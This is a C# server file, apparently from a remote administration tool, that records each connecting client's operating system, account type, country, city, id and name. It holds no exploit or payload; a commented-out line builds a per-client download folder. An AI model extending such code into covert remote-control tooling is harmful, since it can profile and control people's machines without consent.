using Serveur.Controllers.Server;
using Serveur.Packets.ClientPackets;

namespace Serveur.Controllers
{
    //Authentification
    class AuthenticationController
    {
        public static void HandleGetAuthenticationResponse(ClientMosaic client, GetAuthenticationResponse packet)
        {
            if (client.endPoint.Address.ToString() == "255.255.255.255")
                return;

            try
            {
                client.value.version = packet.version;
                client.value.operatingSystem = packet.operatingSystem;
                client.value.accountType = packet.accountType;
                client.value.country = packet.country;
                client.value.countryCode = packet.countryCode;
                client.value.city = packet.city;
                client.value.imageIndex = packet.imageIndex;
                client.value.id = packet.id;
                client.value.name = packet.name;

                // client.Value.DownloadDirectory = (!FileHelper.CheckPathForIllegalChars(client.Value.UserAtPc)) ?
                // Path.Combine(Application.StartupPath, string.Format("Clients\\{0}_{1}\\", client.Value.UserAtPc, client.Value.Id.Substring(0, 7))) :
                //Path.Combine(Application.StartupPath, string.Format("Clients\\{0}_{1}\\", client.EndPoint.Address, client.Value.Id.Substring(0, 7)));

            }
            catch
            {
            }
        }
    }
}
